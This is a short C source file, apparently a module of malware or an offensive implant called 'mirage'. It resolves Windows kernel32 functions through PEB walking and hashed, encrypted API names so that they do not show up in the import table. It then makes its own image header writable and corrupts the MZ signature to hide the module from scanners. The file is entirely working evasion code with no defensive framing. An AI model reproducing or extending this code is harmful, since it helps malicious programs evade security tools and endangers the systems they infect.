#include "peb_hide.h"
#include "config.h"
#include "enc_strings.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"

#ifdef ENABLE_PEB_HIDE
#include <windows.h>

/* PEB-walk: resolve kernel32 APIs without IAT imports */
typedef HMODULE (WINAPI *pGHMW)(const wchar_t *);
typedef BOOL    (WINAPI *pVP)(LPVOID, SIZE_T, DWORD, PDWORD);
static struct { pGHMW pGHMW; pVP pVP; int ready; } g_ph_api;
static int ph_ensure(void) {
    if (g_ph_api.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_GetModuleHandleW, ENC_GETMODULEHANDLEW_LEN, fn);
    g_ph_api.pGHMW = (pGHMW)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_VirtualProtect, ENC_VIRTUALPROTECT_LEN, fn);
    g_ph_api.pVP = (pVP)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_ph_api.pGHMW || !g_ph_api.pVP) return 0;
    g_ph_api.ready = 1;
    return 1;
}

/*
 * mirage_hide_self — Corrupt DOS header MZ signature to hide from
 * module scanners. Destroys e_magic at image base without touching
 * the fragile PEB LDR linked lists.
 */
int mirage_hide_self(void) {
    if (!ph_ensure()) return 0;
    HMODULE mod = g_ph_api.pGHMW(NULL);
    if (!mod) return 0;

    unsigned char *dos = (unsigned char *)mod;
    DWORD old;
    if (g_ph_api.pVP(dos, 0x1000, PAGE_READWRITE, &old)) {
        dos[0] ^= dos[1];
        g_ph_api.pVP(dos, 0x1000, old, &old);
        return 1;
    }
    return 0;
}


#else
int mirage_hide_self(void) { return 0; }
#endif /* ENABLE_PEB_HIDE */
